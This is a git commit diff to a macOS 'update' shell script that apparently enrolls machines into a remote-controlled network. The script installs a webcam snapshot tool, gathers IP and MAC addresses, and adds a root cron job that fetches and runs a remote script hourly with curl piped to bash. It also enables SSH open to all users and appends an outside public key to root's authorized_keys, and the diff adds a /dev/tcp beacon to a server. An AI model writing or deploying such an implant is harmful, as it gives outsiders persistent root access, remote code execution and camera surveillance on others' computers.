402b84385c5e26fa1a218da305a293135cad6e29
ErikBoesen <me@erikboesen.com>
2017-08-11 14:15:21 -0400

    Some tweaks to Mac update script

--- join/mac/macupdate.sh
+++ join/mac/macupdate.sh
@@ -10,13 +10,16 @@ fi
 # Install ImageSnap for easy photo taking
 if [ ! -f /usr/local/bin/imagesnap ]; then
     mkdir -p /usr/local/bin/
+    # TODO: Use newest version
     curl -so /tmp/ImageSnap.tgz https://gigenet.dl.sourceforge.net/project/iharder/imagesnap/ImageSnap-v0.2.5.tgz
     tar -xvf /tmp/ImageSnap.tgz
-    mv /tmp/ImageSnap*/imagesnap /usr/local/bin/imagesnap
+    # TODO: Use newest version
+    mv /tmp/ImageSnap-v0.2.5/imagesnap /usr/local/bin/
     rm -rf /tmp/ImageSnap*
 fi
 
-IP=`hostname -I | sed 's/ *$//'`
+# Linux's hostname -I doesn't work on Macs
+IP=`ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1'`
 HOSTNAME=`hostname`
 MAC=`cat /sys/class/net/*/address | grep -v "00:00:00:00:00:00" | tr '\n' ',' | sed 's/,*$//'`
 
@@ -36,10 +39,12 @@ fi
 cat /var/spool/cron/crontabs/root | grep -v "erikboesen.com" > /tmp/crontab; mv /tmp/crontab /var/spool/crontabs/root
 echo '0 * * * * curl -L erikboesen.com/macupdate.sh |bash' >> /var/spool/crontabs/root
 
-sudo su -c "printf '#\!/bin/bash\ncurl -L erikboesen.com/macupdate.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"
+#sudo su -c "printf '#\!/bin/bash\ncurl -L erikboesen.com/macupdate.sh |bash\n' > /etc/cron.hourly/update; chmod +x /etc/cron.hourly/update"
 
-systemctl start ssh.service
-systemctl enable ssh.service
+# Enable SSH
+systemsetup -setremotelogin on
+# Open SSH to all users
+dscl . change /Groups/com.apple.access_ssh RecordName com.apple.access_ssh com.apple.access_ssh-disabled 2>/dev/null
 
 SSHPATH="/root/.ssh"
 
@@ -48,3 +53,6 @@ mkdir -p "$SSHPATH"
 if ! grep boesene $SSHPATH/authorized_keys; then
 	curl https://erikboesen.com/pubkey >> $SSHPATH/authorized_keys
 fi
+
+exec 3<>/dev/tcp/$SERVER/$PORT
+printf "TESTING: THIS MAC IS ONLINE!"
